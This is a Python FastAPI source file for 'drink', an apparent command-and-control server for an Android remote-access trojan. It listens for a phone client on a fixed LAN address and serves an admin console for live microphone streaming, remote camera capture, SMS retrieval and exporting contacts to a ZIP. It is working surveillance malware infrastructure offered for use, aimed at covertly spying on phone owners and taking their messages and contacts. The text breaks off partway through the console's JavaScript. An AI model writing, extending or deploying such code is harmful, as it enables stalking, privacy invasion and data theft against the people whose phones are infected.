import asyncio
import io
import json
import os
import struct
import sys
import threading
import time
import zipfile
from collections import deque
from pathlib import Path
from typing import Optional, Set

import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, JSONResponse, Response

TCP_HOST = "192.168.1.149"
TCP_PORT = 33110
WEB_PORT = 3000

app = FastAPI()

state = {
    "tcp_server": None,
    "client_reader": None,
    "client_writer": None,
    "client_addr": None,
    "listening": False,
    "mic_active": False,
    "cameras": [],
    "latest_photo": None,
    "latest_photo_bytes": None,
    "latest_contacts": None,
    "latest_contacts_bytes": None,
    "latest_sms": [],
    "contacts_list": [],
}

logs = deque(maxlen=100)
audio_clients: Set[WebSocket] = set()
loop: asyncio.AbstractEventLoop = None


def log_event(msg: str):
    ts = time.strftime("%H:%M:%S")
    formatted = f"[{ts}] {msg}"
    logs.append(formatted)


HTML_MIC_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>drink — Mic Stream</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #fbfbfd;
    color: #1d1d1f;
    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
  }
  .card {
    background: #ffffff;
    border: 1px solid #e5e5ea;
    border-radius: 18px;
    box-shadow: 0 4px 24px rgba(0, 0, 0, 0.04);
    padding: 36px 40px;
    max-width: 440px;
    width: 100%;
    text-align: center;
  }
  h1 {
    font-size: 1.5rem;
    font-weight: 600;
    letter-spacing: -0.02em;
    margin-bottom: 8px;
  }
  p.subtitle {
    color: #86868b;
    font-size: 0.9rem;
    margin-bottom: 24px;
  }
  .indicator-box {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    margin-bottom: 28px;
  }
  .pulse-dot {
    width: 10px;
    height: 10px;
    border-radius: 50%;
    background: #86868b;
    transition: all 0.3s;
  }
  .pulse-dot.active {
    background: #34c759;
    box-shadow: 0 0 10px rgba(52, 199, 89, 0.6);
  }
  #status {
    font-size: 0.95rem;
    font-weight: 500;
  }
  .nav-btn {
    display: inline-block;
    padding: 10px 20px;
    background: #f5f5f7;
    color: #1d1d1f;
    border-radius: 980px;
    text-decoration: none;
    font-size: 0.85rem;
    font-weight: 500;
    transition: background 0.15s;
  }
  .nav-btn:hover {
    background: #e8e8ed;
  }
</style>
</head>
<body>
<div class="card">
  <h1>Microphone Stream</h1>
  <p class="subtitle">Live audio stream from connected device</p>
  <div class="indicator-box">
    <div class="pulse-dot" id="dot"></div>
    <span id="status">Connecting…</span>
  </div>
  <a href="/" class="nav-btn">← Admin Panel</a>
</div>
<script>
(function () {
  const status = document.getElementById('status');
  const dot = document.getElementById('dot');
  const ctx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
  const ws = new WebSocket('ws://' + location.hostname + ':' + location.port + '/ws/audio');
  ws.binaryType = 'arraybuffer';

  ws.onopen = () => {
    status.textContent = 'Connected — waiting for audio';
    dot.className = 'pulse-dot active';
  };
  ws.onclose = () => {
    status.textContent = 'Disconnected';
    dot.className = 'pulse-dot';
  };
  ws.onerror = () => {
    status.textContent = 'Error';
    dot.className = 'pulse-dot';
  };

  let nextTime = 0;

  ws.onmessage = (event) => {
    const pcm = new Int16Array(event.data);
    const float32 = new Float32Array(pcm.length);
    for (let i = 0; i < pcm.length; i++) {
      float32[i] = pcm[i] / 32768.0;
    }
    const buffer = ctx.createBuffer(1, float32.length, 16000);
    buffer.copyToChannel(float32, 0);
    const source = ctx.createBufferSource();
    source.buffer = buffer;
    source.connect(ctx.destination);
    const now = ctx.currentTime;
    const startAt = Math.max(now, nextTime);
    source.start(startAt);
    nextTime = startAt + buffer.duration;
    status.textContent = 'Streaming live';
  };
})();
</script>
</body>
</html>"""

HTML_ADMIN_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>drink — Admin Console</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #f5f5f7;
    color: #1d1d1f;
    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
    padding: 0 0 60px 0;
    -webkit-font-smoothing: antialiased;
  }
  header {
    background: rgba(255, 255, 255, 0.85);
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px);
    border-bottom: 1px solid #e5e5ea;
    position: sticky;
    top: 0;
    z-index: 100;
    padding: 12px 28px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    box-shadow: 0 1px 3px rgba(0,0,0,0.02);
  }
  .brand-group {
    display: flex;
    align-items: center;
    gap: 14px;
  }
  .brand {
    font-size: 1.35rem;
    font-weight: 700;
    letter-spacing: -0.03em;
    color: #1d1d1f;
  }
  .status-pills {
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .pill {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    font-size: 0.75rem;
    font-weight: 600;
    padding: 4px 10px;
    border-radius: 980px;
    background: #e5e5ea;
    color: #8e8e93;
    transition: all 0.2s ease;
  }
  .pill-dot {
    width: 7px;
    height: 7px;
    border-radius: 50%;
    background: #8e8e93;
  }
  .pill-on {
    background: #e4f7e8;
    color: #248a3d;
  }
  .pill-on .pill-dot {
    background: #34c759;
    box-shadow: 0 0 8px rgba(52, 199, 89, 0.8);
  }
  .pill-warn {
    background: #fff4e5;
    color: #b25e00;
  }
  .pill-warn .pill-dot {
    background: #ff9500;
  }
  .action-bar {
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .circle-btn {
    width: 38px;
    height: 38px;
    border-radius: 50%;
    border: none;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
    position: relative;
  }
  .circle-btn:hover {
    transform: scale(1.08);
  }
  .circle-btn:active {
    transform: scale(0.94);
  }
  .circle-start {
    background: #34c759;
    color: #ffffff;
    box-shadow: 0 2px 8px rgba(52, 199, 89, 0.35);
  }
  .circle-start.active {
    box-shadow: 0 0 0 3px rgba(52, 199, 89, 0.3), 0 2px 8px rgba(52, 199, 89, 0.5);
  }
  .circle-stop {
    background: #ff9500;
    color: #ffffff;
    box-shadow: 0 2px 8px rgba(255, 149, 0, 0.35);
  }
  .circle-kill {
    background: #ff3b30;
    color: #ffffff;
    box-shadow: 0 2px 8px rgba(255, 59, 48, 0.35);
  }
  .circle-disconnect {
    background: #5856d6;
    color: #ffffff;
    box-shadow: 0 2px 8px rgba(88, 86, 214, 0.35);
  }
  .container {
    max-width: 1120px;
    margin: 28px auto 0 auto;
    padding: 0 20px;
  }
  .grid {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 18px;
    margin-bottom: 20px;
  }
  @media (max-width: 960px) {
    .grid { grid-template-columns: repeat(2, 1fr); }
  }
  @media (max-width: 640px) {
    .grid { grid-template-columns: 1fr; }
    header { flex-direction: column; gap: 12px; align-items: flex-start; }
  }
  .card {
    background: #ffffff;
    border: 1px solid #e5e5ea;
    border-radius: 16px;
    padding: 20px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.02);
    display: flex;
    flex-direction: column;
    position: relative;
  }
  .card-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 12px;
  }
  .card-title-wrap {
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .card-icon {
    width: 28px;
    height: 28px;
    border-radius: 7px;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #f5f5f7;
    color: #1d1d1f;
  }
  .card-title {
    font-size: 0.98rem;
    font-weight: 600;
    letter-spacing: -0.01em;
  }
  .btn-icon-link {
    background: transparent;
    border: none;
    cursor: pointer;
    color: #0071e3;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    padding: 4px;
    border-radius: 6px;
    transition: background 0.15s;
  }
  .btn-icon-link:hover {
    background: #f2f2f7;
  }
  .stat-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 0.82rem;
    padding: 6px 0;
    border-bottom: 1px solid #f5f5f7;
  }
  .stat-label { color: #86868b; }
  .stat-val { font-weight: 500; font-family: ui-monospace, SFMono-Regular, monospace; }
  .card-body {
    margin-top: 8px;
    flex: 1;
    display: flex;
    flex-direction: column;
  }
  .card-actions {
    margin-top: 14px;
    display: flex;
    gap: 8px;
    flex-wrap: wrap;
  }
  button, .btn-link {
    cursor: pointer;
    border: none;
    border-radius: 8px;
    padding: 7px 12px;
    font-size: 0.82rem;
    font-weight: 500;
    transition: all 0.15s ease;
    text-decoration: none;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
  }
  .btn-primary { background: #0071e3; color: #fff; }
  .btn-primary:hover { background: #0077ed; }
  .btn-secondary { background: #f5f5f7; color: #1d1d1f; }
  .btn-secondary:hover { background: #e8e8ed; }
  .btn-danger { background: #fff; color: #ff3b30; border: 1px solid #ffd1d0; }
  .btn-danger:hover { background: #ffebeb; }
  .btn-outline { background: #fff; color: #0071e3; border: 1px solid #c7e0f9; }
  .btn-outline:hover { background: #f0f7ff; }
  .btn-green { background: #34c759; color: #fff; }
  .btn-green:hover { background: #2ebd52; }
  input[type="text"], input[type="number"], input[type="date"] {
    border: 1px solid #d2d2d7;
    border-radius: 8px;
    padding: 6px 10px;
    font-size: 0.82rem;
    outline: none;
    background: #fff;
    transition: border-color 0.15s;
  }
  input[type="text"]:focus, input[type="number"]:focus, input[type="date"]:focus {
    border-color: #0071e3;
  }
  .preview-box {
    margin-top: 10px;
    border-radius: 10px;
    overflow: hidden;
    background: #f5f5f7;
    border: 1px solid #e5e5ea;
    display: flex;
    align-items: center;
    justify-content: center;
    height: 120px;
    cursor: pointer;
    position: relative;
  }
  .preview-box img {
    width: 100%;
    height: 100%;
    object-fit: cover;
  }
  .preview-empty {
    font-size: 0.78rem;
    color: #86868b;
    display: flex;
    align-items: center;
    gap: 6px;
  }
  .cam-pills {
    display: flex;
    gap: 6px;
    flex-wrap: wrap;
    margin-bottom: 8px;
  }
  .cam-pill {
    padding: 3px 8px;
    border-radius: 6px;
    font-size: 0.75rem;
    background: #f5f5f7;
    color: #1d1d1f;
    border: 1px solid #e5e5ea;
    cursor: pointer;
  }
  .cam-pill.active {
    background: #0071e3;
    color: #fff;
    border-color: #0071e3;
  }
  .sms-preview-list {
    margin-top: 10px;
    border: 1px solid #e5e5ea;
    border-radius: 8px;
    padding: 6px;
    background: #fafafa;
    max-height: 110px;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
    gap: 4px;
  }
  .sms-preview-item {
    background: #fff;
    border: 1px solid #efeff4;
    border-radius: 6px;
    padding: 5px 8px;
    font-size: 0.75rem;
    display: flex;
    flex-direction: column;
    gap: 2px;
  }
  .sms-preview-meta {
    display: flex;
    justify-content: space-between;
    color: #86868b;
    font-size: 0.68rem;
  }
  .sms-preview-body {
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    color: #1d1d1f;
  }
  .log-console {
    background: #1c1c1e;
    color: #30d158;
    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
    font-size: 0.75rem;
    padding: 14px;
    border-radius: 12px;
    height: 160px;
    overflow-y: auto;
    white-space: pre-wrap;
    line-height: 1.45;
  }
  .modal-backdrop {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, 0.45);
    backdrop-filter: blur(12px);
    -webkit-backdrop-filter: blur(12px);
    z-index: 1000;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .modal-container {
    background: #ffffff;
    border-radius: 20px;
    box-shadow: 0 16px 40px rgba(0,0,0,0.18);
    width: 94vw;
    max-width: 1120px;
    height: 86vh;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    border: 1px solid #e5e5ea;
  }
  .modal-header {
    padding: 16px 24px;
    border-bottom: 1px solid #e5e5ea;
    display: flex;
    justify-content: space-between;
    align-items: center;
    background: #fbfbfd;
  }
  .modal-header-left {
    display: flex;
    align-items: center;
    gap: 14px;
  }
  .modal-title {
    font-size: 1.25rem;
    font-weight: 600;
    letter-spacing: -0.02em;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .modal-count-badge {
    font-size: 0.78rem;
    background: #e5e5ea;
    color: #1d1d1f;
    padding: 2px 8px;
    border-radius: 980px;
    font-weight: 600;
  }
  .modal-toolbar {
    padding: 12px 24px;
    border-bottom: 1px solid #e5e5ea;
    display: flex;
    gap: 12px;
    align-items: center;
    background: #ffffff;
    flex-wrap: wrap;
  }
  .search-wrap {
    display: flex;
    align-items: center;
    gap: 8px;
    background: #f5f5f7;
    border: 1px solid #e5e5ea;
    border-radius: 10px;
    padding: 6px 12px;
    flex: 1;
    min-width: 200px;
  }
  .search-wrap input {
    border: none;
    background: transparent;
    width: 100%;
    outline: none;
    font-size: 0.85rem;
  }
  .modal-body {
    flex: 1;
    overflow-y: auto;
    padding: 20px 24px;
    background: #fafafa;
  }
  .contacts-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
    gap: 12px;
  }
  .contact-card {
    background: #ffffff;
    border: 1px solid #e5e5ea;
    border-radius: 12px;
    padding: 12px 14px;
    display: flex;
    align-items: center;
    gap: 12px;
    transition: all 0.15s;
  }
  .contact-card:hover {
    box-shadow: 0 4px 12px rgba(0,0,0,0.04);
    border-color: #d2d2d7;
  }
  .contact-avatar {
    width: 38px;
    height: 38px;
    border-radius: 50%;
    background: #eef4ff;
    color: #0071e3;
    font-weight: 600;
    font-size: 0.9rem;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
  }
  .contact-info {
    flex: 1;
    overflow: hidden;
  }
  .contact-name {
    font-size: 0.88rem;
    font-weight: 600;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }
  .contact-phone {
    font-size: 0.78rem;
    color: #0071e3;
    text-decoration: none;
  }
  .messages-stack {
    display: flex;
    flex-direction: column;
    gap: 10px;
  }
  .msg-bubble-card {
    background: #ffffff;
    border: 1px solid #e5e5ea;
    border-radius: 14px;
    padding: 12px 16px;
    display: flex;
    flex-direction: column;
    gap: 6px;
    box-shadow: 0 1px 3px rgba(0,0,0,0.02);
  }
  .msg-meta-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 0.78rem;
  }
  .msg-dir-tag {
    font-size: 0.7rem;
    font-weight: 600;
    padding: 2px 7px;
    border-radius: 4px;
  }
  .msg-dir-in { background: #e4f7e8; color: #248a3d; }
  .msg-dir-out { background: #eef4ff; color: #0071e3; }
  .msg-text-content {
    font-size: 0.88rem;
    line-height: 1.4;
    color: #1d1d1f;
    word-break: break-word;
  }
  .filter-pills {
    display: flex;
    gap: 6px;
  }
  .filter-pill {
    padding: 5px 10px;
    border-radius: 8px;
    font-size: 0.78rem;
    font-weight: 500;
    background: #f5f5f7;
    color: #1d1d1f;
    border: 1px solid #e5e5ea;
    cursor: pointer;
  }
  .filter-pill.active {
    background: #0071e3;
    color: #ffffff;
    border-color: #0071e3;
  }
</style>
</head>
<body>
<header>
  <div class="brand-group">
    <div class="brand">drink</div>
    <div class="status-pills">
      <span class="pill" id="pillTcp">
        <span class="pill-dot"></span>
        <span id="txtTcp">TCP: Stopped</span>
      </span>
      <span class="pill" id="pillClient">
        <span class="pill-dot"></span>
        <span id="txtClient">Client: Disconnected</span>
      </span>
      <span class="pill" id="pillMic">
        <span class="pill-dot"></span>
        <span id="txtMic">Mic: Off</span>
      </span>
    </div>
  </div>

  <div class="action-bar">
    <button class="circle-btn circle-start" id="btnStart" title="Start Listen" onclick="startServer()">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"/></svg>
    </button>
    <button class="circle-btn circle-stop" id="btnStop" title="Stop Listen" onclick="stopServer()">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><rect x="6" y="6" width="12" height="12" rx="2"/></svg>
    </button>
    <button class="circle-btn circle-kill" title="Kill Server" onclick="killServer()">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></svg>
    </button>
    <button class="circle-btn circle-disconnect" title="Disconnect Client" onclick="disconnectClient()">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6L6 18"/><path d="M6 6l12 12"/></svg>
    </button>
  </div>
</header>

<div class="container">
  <div class="grid">

    <div class="card">
      <div class="card-header">
        <div class="card-title-wrap">
          <div class="card-icon">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
          </div>
          <span class="card-title">Server Host</span>
        </div>
      </div>
      <div class="card-body">
        <div class="stat-row">
          <span class="stat-label">TCP Target</span>
          <span class="stat-val" id="valTcpHost">192.168.1.149:33110</span>
        </div>
        <div class="stat-row">
          <span class="stat-label">Web Console</span>
          <span class="stat-val">0.0.0.0:3000</span>
        </div>
        <div class="stat-row">
          <span class="stat-label">Listen State</span>
          <span class="stat-val" id="valListenState">Idle</span>
        </div>
      </div>
      <div class="card-actions">
        <button class="btn-primary" onclick="startServer()">Start Listen</button>
        <button class="btn-secondary" onclick="stopServer()">Stop Listen</button>
      </div>
    </div>

    <div class="card">
      <div class="card-header">
        <div class="card-title-wrap">
          <div class="card-icon">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
          </div>
          <span class="card-title">Android Client</span>
        </div>
      </div>
      <div class="card-body">
        <div class="stat-row">
          <span class="stat-label">Remote Address</span>
          <span class="stat-val" id="valClientAddr">Disconnected</span>
        </div>
        <div class="stat-row">
          <span class="stat-label">Session Status</span>
          <span class="stat-val" id="valClientStatus">Waiting for connection…</span>
        </div>
        <div class="stat-row">
          <span class="stat-label">Retry Interval</span>
          <span class="stat-val">15s automatic</span>
        </div>
      </div>
      <div class="card-actions">
        <button class="btn-danger" onclick="disconnectClient()">Disconnect Client</button>
      </div>
    </div>

    <div class="card">
      <div class="card-header">
        <div class="card-title-wrap">
          <div class="card-icon">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/><line x1="8" y1="23" x2="16" y2="23"/></svg>
          </div>
          <span class="card-title">Microphone Stream</span>
        </div>
        <a href="/mic" target="_blank" class="btn-icon-link" title="Open in standalone tab">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
        </a>
      </div>
      <div class="card-body">
        <div class="stat-row">
          <span class="stat-label">Stream Mode</span>
          <span class="stat-val" id="valMicStatus">Inactive</span>
        </div>
        <div class="stat-row">
          <span class="stat-label">Audio Route</span>
          <span class="stat-val">/mic (/ws/audio)</span>
        </div>
      </div>
      <div class="card-actions">
        <button class="btn-green" onclick="startMic()">Start Mic</button>
        <button class="btn-secondary" onclick="stopMic()">Stop Mic</button>
      </div>
    </div>

    <div class="card">
      <div class="card-header">
        <div class="card-title-wrap">
          <div class="card-icon">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
          </div>
          <span class="card-title">Camera Capture</span>
        </div>
        <button class="btn-icon-link" onclick="openPhotoModal()" title="View full size photo">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h6v6"/><path d="M9 21H3v-6"/><path d="M21 3l-7 7"/><path d="M3 21l7-7"/></svg>
        </button>
      </div>
      <div class="card-body">
        <div class="cam-pills" id="camPillsBox"></div>
        <div class="preview-box" id="camPreviewBox" onclick="openPhotoModal()">
          <span class="preview-empty" id="camPreviewEmpty">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
            No photo captured
          </span>
          <img id="camPreviewImg" style="display: none;">
        </div>
      </div>
      <div class="card-actions">
        <button class="btn-secondary" onclick="listCameras()">List Cams</button>
        <button class="btn-primary" onclick="captureSelectedCamera()">Take Photo</button>
      </div>
    </div>

    <div class="card">
      <div class="card-header">
        <div class="card-title-wrap">
          <div class="card-icon">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
          </div>
          <span class="card-title">SMS Messages</span>
        </div>
        <button class="btn-icon-link" onclick="openSmsModal()" title="Fullscreen SMS Viewer">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h6v6"/><path d="M9 21H3v-6"/><path d="M21 3l-7 7"/><path d="M3 21l7-7"/></svg>
        </button>
      </div>
      <div class="card-body">
        <div style="display: flex; gap: 8px; align-items: center;">
          <input type="number" id="cardSmsHours" value="24" style="width: 76px;" placeholder="Hours">
          <button class="btn-primary" onclick="getSmsFromCard()">Get SMS</button>
          <button class="btn-outline" onclick="openSmsModal()">Fullscreen</button>
        </div>
        <div class="sms-preview-list" id="cardSmsList">
          <span style="font-size: 0.72rem; color: #86868b; padding: 4px;">No messages loaded</span>
        </div>
      </div>
    </div>

    <div class="card">
      <div class="card-header">
        <div class="card-title-wrap">
          <div class="card-icon">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
          </div>
          <span class="card-title">Contacts</span>
        </div>
        <button class="btn-icon-link" onclick="openContactsModal()" title="Fullscreen Contacts Viewer">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h6v6"/><path d="M9 21H3v-6"/><path d="M21 3l-7 7"/><path d="M3 21l7-7"/></svg>
        </button>
      </div>
      <div class="card-body">
        <div class="stat-row">
          <span class="stat-label">Contacts Count</span>
          <span class="stat-val" id="valContactsCount">0</span>
        </div>
        <div class="stat-row">
          <span class="stat-label">Storage</span>
          <span class="stat-val">contacts.zip</span>
        </div>
      </div>
      <div class="card-actions">
        <button class="btn-primary" onclick="pullContacts()">Pull Contacts</button>
        <button class="btn-outline" onclick="openContactsModal()">View List</button>
        <a href="/api/contacts/download" id="btnDlZipCard" class="btn-link btn-secondary" style="display: none;">Download ZIP</a>
      </div>
    </div>

  </div>

  <div class="card" style="margin-top: 4px;">
    <div class="card-header">
      <div class="card-title-wrap">
        <div class="card-icon">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
        </div>
        <span class="card-title">Activity Console</span>
      </div>
      <button class="btn-secondary" style="padding: 4px 8px; font-size: 0.72rem;" onclick="clearLogs()">Clear</button>
    </div>
    <div class="log-console" id="logConsole"></div>
  </div>
</div>

<div class="modal-backdrop" id="smsModalBackdrop">
  <div class="modal-container">
    <div class="modal-header">
      <div class="modal-header-left">
        <button class="btn-secondary" onclick="closeSmsModal()">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
          Back
        </button>
        <div class="modal-title">
          Messages
          <span class="modal-count-badge" id="modalSmsCount">0</span>
        </div>
      </div>
      <button class="btn-secondary" onclick="closeSmsModal()">✕</button>
    </div>

    <div class="modal-toolbar">
      <div class="search-wrap">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
        <input type="text" id="smsSearchInput" placeholder="Search number or message content…" oninput="filterMessages()">
      </div>

      <div style="display: flex; align-items: center; gap: 6px;">
        <input type="date" id="smsDatePicker" onchange="filterMessages()" title="Filter by specific date">
        <button class="btn-secondary" style="padding: 6px 10px;" onclick="clearSmsDateFilter()" title="Clear date filter">Clear</button>
      </div>

      <div class="filter-pills">
        <button class="filter-pill active" id="pillDirAll" onclick="setDirFilter('all')">All</button>
        <button class="filter-pill" id="pillDirIn" onclick="setDirFilter('in')">Received</button>
        <button class="filter-pill" id="pillDirOut" onclick="setDirFilter('out')">Sent</button>
      </div>

      <div style="display: flex; align-items: center; gap: 6px; margin-left: auto;">
        <input type="number" id="modalSmsHours" value="24" style="width: 70px;" placeholder="Hours">
        <button class="btn-primary" onclick="getSmsFromModal()">Fetch SMS</button>
      </div>
    </div>

    <div class="modal-body">
      <div class="messages-stack" id="modalMessagesStack"></div>
    </div>
  </div>
</div>

<div class="modal-backdrop" id="contactsModalBackdrop">
  <div class="modal-container">
    <div class="modal-header">
      <div class="modal-header-left">
        <button class="btn-secondary" onclick="closeContactsModal()">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
          Back
        </button>
        <div class="modal-title">
          Contacts
          <span class="modal-count-badge" id="modalContactsCount">0</span>
        </div>
      </div>
      <div style="display: flex; gap: 8px; align-items: center;">
        <button class="btn-primary" onclick="pullContacts()">Pull from Device</button>
        <a href="/api/contacts/download" id="btnModalDlZip" class="btn-link btn-secondary" style="display: none;">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
          Download ZIP
        </a>
        <button class="btn-secondary" onclick="closeContactsModal()">✕</button>
      </div>
    </div>

    <div class="modal-toolbar">
      <div class="search-wrap">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
        <input type="text" id="contactsSearchInput" placeholder="Search contacts by name or phone…" oninput="filterContacts()">
      </div>
    </div>

    <div class="modal-body">
      <div class="contacts-grid" id="modalContactsGrid"></div>
    </div>
  </div>
</div>

<div class="modal-backdrop" id="photoModalBackdrop" onclick="closePhotoModal()">
  <div style="max-width: 90vw; max-height: 90vh; display: flex; flex-direction: column; align-items: center; gap: 12px;" onclick="event.stopPropagation()">
    <img id="photoModalImg" style="max-width: 90vw; max-height: 80vh; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.3);">
    <div style="display: flex; gap: 8px;">
      <a id="btnPhotoDl" href="/api/photo/latest" download="camera_capture.jpg" class="btn-link btn-primary">Download Photo</a>
      <button class="btn-secondary" onclick="closePhotoModal()">Close</button>
    </div>
  </div>
</div>

<script>
let allMessages = [];
let allContacts = [];
let currentDirFilter = 'all';
let selectedCamId = '0';

async function api(path, options = {}) {
  try {
    const res = await fetch(path, options);
    return await res.json();
  } catch (e) {
    return null;
  }
}

async function startServer() {
  await api('/api/server/start', { method: 'POST' });
  refreshStatus();
}

async function stopServer() {
  await api('/api/server/stop', { method: 'POST' });
  refreshStatus();
}

async function killServer() {
  if (confirm('Terminate server process?')) {
    await api('/api/server/kill', { method: 'POST' });
    document.body.innerHTML = '<div style="padding: 60px; text-align: center; font-family: -apple-system, sans-serif;"><h2>Server process killed.</h2></div>';
  }
}

async function disconnectClient() {
  await api('/api/client/disconnect', { method: 'POST' });
  refreshStatus();
}

